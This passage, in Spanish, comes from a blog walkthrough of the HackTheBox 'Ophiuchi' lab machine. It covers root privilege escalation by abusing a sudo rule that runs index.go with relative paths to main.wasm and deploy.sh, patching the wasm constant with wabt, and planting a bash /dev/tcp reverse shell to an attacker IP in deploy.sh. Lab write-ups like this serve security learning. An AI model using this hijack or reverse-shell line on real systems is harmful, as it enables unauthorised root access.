+<p>Aprovechemos que tenemos la contraseña del usuario <code>admin</code> para migrarnos al servicio <code>SSH</code>:</p>
+
+<pre><code class="language-bash">❭ ssh admin@10.10.10.227
+admin@10.10.10.227's password:             
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
+...
+</code></pre>
+
+<p>Listo, mejor e.e</p>
+
+<p>Validando que acciones puede llevar a cabo <code>admin</code> como <code>root</code> usando <strong>sudo</strong>, tenemos:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:~$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre>
+
+<p>Vale vale valeee… Podemos ejecutar un programa llamado <code>index.go</code> usando el binario <code>/usr/bin/go</code> donde si empleamos <strong>sudo</strong> haremos el proceso como <code>root</code>. Juguemos a ver como podemos aprovechar esto.</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ ls -la
+total 3928
+drwxr-xr-x 3 root root    4096 Oct 14 19:52 .
+drwxr-xr-x 5 root root    4096 Oct 14 09:56 ..
+drwxr-xr-x 2 root root    4096 Oct 14 19:52 backup
+-rw-r--r-- 1 root root      88 Oct 14 19:49 deploy.sh
+-rwxr-xr-x 1 root root 2516736 Oct 14 19:52 index
+-rw-rw-r-- 1 root root     522 Oct 14 19:48 index.go
+-rwxrwxr-x 1 root root 1479371 Oct 14 19:41 main.wasm
+</code></pre>
+
+<p>Veamos el archivo que podemos ejecutar:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ cat index.go 
+</code></pre>
+
+<pre><code class="language-go">package main
+
+import (
+        "fmt"
+        wasm "github.com/wasmerio/wasmer-go/wasmer"
+        "os/exec"
+        "log"
+)
+
+func main() {
+        bytes, _ := wasm.ReadBytes("main.wasm")
+
+        instance, _ := wasm.NewInstance(bytes)
+        defer instance.Close()
+        init := instance.Exports["info"]
+        result,_ := init()
+        f := result.String()
+        if (f != "1") {
+                fmt.Println("Not ready to deploy")
+        } else {
+                fmt.Println("Ready to deploy")
+                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+                if err != nil {
+                        log.Fatal(err)
+                }
+                fmt.Println(string(out))
+        }
+}
+</code></pre>
+
+<p>Démosle un recorrido rápido para entender que esta haciendo:</p>
+
+<blockquote>
+  <p><a href="https://gist.github.com/Hywan/82ce861a6e03991d9f23f6a4172eb486">Este ejemplo es parecido y más intuitivo - Simple example <strong>Go WASM</strong></a>.</p>
+</blockquote>
+
+<p><strong><em>(Igual hay bastantes en internet, pueda que me explique fatal y no se entienda nada :P)</em></strong></p>
+
+<p><span style="color:red;">1. </span>Importa librerías y una en especial se trata de <code>/wasmer-go/wasmer</code>, la definición <a href="https://github.com/wasmerio/wasmer">propia del repositorio</a> nos dice:</p>
+
+<blockquote>
+  <p>Wasmer enables super lightweight containers based on WebAssembly that can run anywhere: from Desktop to the Cloud and IoT devices, and also embedded in any programming language.</p>
+</blockquote>
+
+<p>Pero en este caso enfocado en <code>go</code> (<strong><a href="https://github.com/wasmerio/wasmer-go">wasmer-go</a></strong>).</p>
+
+<ul>
+  <li><a href="https://pablomagaz.com/blog/empezando-con-webassembly">¿Qué es WebAssembly (<strong>WASM</strong>)?</a>.</li>
+</ul>
+
+<blockquote>
+  <p>Basicamente es codigo nativo que el navegador va a entender a más bajo nivel.</p>
+</blockquote>
+
+<p><span style="color:red;">2. </span>El archivo <code>main.wasm</code> se obtiene de la <a href="https://parzibyte.me/blog/2019/05/29/webassembly-go-tutorial-ejemplos/">compilación de un objeto <code>.go</code></a>. (Que en este caso, entiendo que no tenemos, ya que <code>index.go</code> es el que lo llama). <strong>No tiene ruta absoluta, por lo tanto podemos aprovecharnos para crear el propio, ya que tomara el objeto de la ruta en la que estemos</strong>.</p>
+
+<ul>
+  <li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-variables-and-constants-in-go-es">Variables de declaración (<code>:=</code>) y asignación (<code>=</code>) en <strong>Go</strong></a>.</li>
+</ul>
+
+<p><span style="color:red;">3. </span>Obtiene los bytes del binario y las demás variables que no usemos se guardaran en la nada.</p>
+
+<ul>
+  <li><a href="https://www.geeksforgeeks.org/what-is-blank-identifierunderscore-in-golang/">Blank Identifier (<code>_</code>) in <strong>Go</strong></a>.</li>
+</ul>
+
+<p><span style="color:red;">4. </span>De la instancia de <strong>bytes</strong> extraerá la data de <code>info</code> y la guardará en <code>init</code>.</p>
+
+<p><span style="color:red;">5. </span>Extrae el resultado (ahí realmente no sé que hace). Y lo guarda en formato <code>String()</code> sobre la variable <code>f</code>.</p>
+
+<p><span style="color:red;">6. </span>Simplemente válida si es diferente de <code>"1"</code>. Si no lo es, nos imprime <code>"Not ready to deploy"</code>, pero si es diferente de <code>"1"</code>.</p>
+
+<p><span style="color:red;">7. </span>Ejecuta el contenido del archivo <code>deploy.sh</code>. <strong>Tampoco tiene ruta absoluta, el mismo juego que con el archivo <code>main.wasm</code></strong>.</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+</code></pre>
+
+<p>Si ejecutamos la línea que podemos correr con <code>sudo</code> en esta ruta tenemos el siguiente mensaje:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+</code></pre>
+
+<p>Quiere decir que la variable <code>f</code> esta con un valor distinto a <code>"1"</code>.</p>
+
+<p>Lo curioso es que no tenemos manera de sobreescribir ningún archivo, o crear nuevos en ninguna de estas rutas. La carpeta <code>/backup</code> es intrigante, pero tiene los mismos archivos que <code>/wasm-functions</code> (bueno, falta el <code>index</code>, pero no podemos generarlo, indica que no encuentra la librería de la que ya hablamos antes). Asi que tamos F, a seguir pensando como podemos explotar esto o si es un <code>rabbit hole</code>…</p>
+
+<p>Podemos destacar que el <code>"1"</code> que necesitamos para poder entrar a ejecutar el archivo <code>deploy.sh</code>, viene del binario <code>main.wasm</code>. Asi que de alguna manera debemos cambiarlo… Pensamos en <code>buffer overflow</code> para modificar el flujo pero jmm…</p>
+
+<p>Bueno, despues de bastante rato perdido y sobre pensando las cosas, me fui para el foro y ahí me di cuenta de algo. Es un binario <code>wasm</code>, por lo tanto no es <em>human-readable</em>, si buscamos en internet como modificar un archivo <code>.wasm</code> nos <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm">encontramos con una explicación bastante interesante</a>. En una parte nombra la herramienta que usa: <a href="https://github.com/WebAssembly/wabt">wabt</a>.</p>
+
+<p>La cual nos permite jugar con archivos <code>WASM</code> para transformarlos en formato <code>WAT</code> (muchas más cosas), que sería el formato <strong>.txt</strong> de los binarios, asi es más fácil de leer que esta haciendo el programa… Después de instalar la herramienta, podemos pasarnos el binario <code>main.wasm</code> a nuestra máquina y verlo en formato <code>.wat</code>:</p>
+
+<pre><code class="language-bash">❭ wabt/bin/wasm2wat main.wasm 
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+</code></pre>
+
+<p>Bien, vemos el llamado a la función <code>info</code> (que es de donde obtenemos el valor distinto de <code>"1"</code>) y las demás definiciones, pero claramente a nosotros nos interesa jugar con <code>info</code>…</p>
+
+<p>Si nos fijamos la definición sería tal que así:</p>
+
+<pre><code class="language-assembly">(func $info (type 0) (result i32) i32.const 0)
+</code></pre>
+
+<p>Donde tenemos una constante con valor <code>0</code>… Pues si nosotros estamos esperando un <code>1</code> podemos aprovechar esa línea para cambiarle el valor. Para modificar el archivo debemos guardarlo en formato <code>.wat</code> y despues volverlo a pasar a formato <code>.wasm</code>:</p>
+
+<pre><code class="language-bash">❭ wabt/bin/wasm2wat main.wasm -o main.wat
+</code></pre>
+
+<p>Modificamos la constante:</p>
+
+<pre><code class="language-bash">❭ cat main.wat 
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 1)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+</code></pre>
+
+<p>Y ahora lo pasamos a formato <code>.wasm</code>:</p>
+
+<pre><code class="language-bash">❭ wabt/bin/wat2wasm main.wat -o main.wasm
+</code></pre>
+
+<p>Listo, antes de subirlo a la máquina. Creemos una carpeta temporal para poner nuestros objetos de trabajo, movamos ahí el archivo <code>deploy.sh</code> y modifiquémoslo para que nos entregue una Shell:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/dev/shm/test$ cat deploy.sh 
+#!/bin/bash
+
+/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+</code></pre>
+
+<p>Ahora sí, subamos el binario y ejecutemos la instrucción <code>sudo</code>:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/dev/shm/test$ chmod + main.wasm 
+admin@ophiuchi:/dev/shm/test$ ls
+deploy.sh  main.wasm
+admin@ophiuchi:/dev/shm/test$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+
+admin@ophiuchi:/dev/shm/test$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+</code></pre>
+
+<p>Pero no nos ha cambiado… Aunque al menos sabemos que ya esta entrando a la ejecución (: Hagamos una Reverse Shell.</p>
+
+<p>Nos ponemos en escucha por el puerto <code>4433</code> y modificamos el archivo <code>deploy.sh</code>:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/dev/shm/test$ cat deploy.sh 
+#!/bin/bash
+
+bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.51/4433 0&gt;&amp;1"
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+</code></pre>
+
+<p>Y en el listener, obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315bash_revSH_root.png" alt="315bash_revSH_root" /></p>
+
+<p>Perfectoooooo, tenemos una Shell como el usuario <code>root</code>.</p>
+
+<p>Solo nos quedaría ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315flags.png" alt="315flags" /></p>
+
+<p>…</p>
+
+<p>Bueno, la deserialización se esta volviendo mi ataque favorito. Esta en todos lados :P Mu gusto mucho el inicio, la escalada estuvo interesante, pero no sé, no me termino de gustar. Pero igual, todo es aprendizaje (:</p>
+
+<p>Muchas gracias por pasarse y leer este montón de cosas, que tengas una feliz noche (:</p>
+
+<p>Y como siempre. A. Seguir. Rompiendo. Todo.</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Ophiuchi&url=http://localhost:4000/htb/ophiuchi" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#YAML">YAML</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#deserialization">deserialization</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#go">go</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#reversing">reversing</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#tomcat">tomcat</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#webAssembly">webAssembly</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/proper">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png" alt="HackTheBox - Proper"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/proper">HackTheBox - Proper</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Agregamos sal a nuestra inyección SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creación de scripts en PowerShell y pipes conseguiremos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/crimestoppers">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotación web con filtros (wrappers) consiguiendo LFI y RCE, contraseñas de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptografía....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/tenet">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" alt="HackTheBox - Tenet"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/tenet">HackTheBox - Tenet</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos deserialización insegura de objetos en PHP, reutilización de contraseñas y encontraremos pequeños fallos en scripts de bash :P
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">12 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
